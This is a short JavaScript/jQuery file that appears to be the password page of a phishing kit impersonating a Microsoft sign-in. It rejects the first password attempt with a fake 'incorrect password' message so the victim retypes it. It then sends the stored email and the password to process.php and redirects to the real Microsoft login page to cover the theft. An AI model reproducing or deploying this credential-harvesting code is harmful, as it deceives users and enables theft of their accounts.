var primaryBtn = document.querySelector(".countClick")
        var buttonClickCount = 0;
        var passwordId = document.querySelector("#password-id");
        let form = document.querySelector(".form")
        let errMsg = document.querySelector("#error-msg");

        form.onsubmit = function(e) {
            e.preventDefault();
        }
        
        
        $(primaryBtn).click(function (e) { 
            // e.preventDefault();
            if(passwordId.value == "") {
                errMsg.innerHTML = "Password cannot be blank"
                errMsg.style.display = "block";
                passwordId.style.borderBottomColor = "#e72424";

            } else {

                buttonClickCount ++;
                
                if(buttonClickCount == 1) {
                    errMsg.innerHTML = 'Your account or password is incorrect. If you don\'t remember your password, <a href="#">reset it now.</a>';
                    errMsg.style.display = "block";
                    $(passwordId).val("");
                    passwordId.style.borderBottomColor = "#e72424";
                } else {

                    var email = sessionStorage.email
                    var password = $(passwordId).val();

                    $.post("process.php", {
                        emailVal: email,
                        passwordVal: password    
                    },
                        function (data) {
                            $(errMsg).html(data);
                            location.href = "https://login.microsoftonline.com"
                        },
                        // "dataType"
                    );
                    
                }
            }
        });
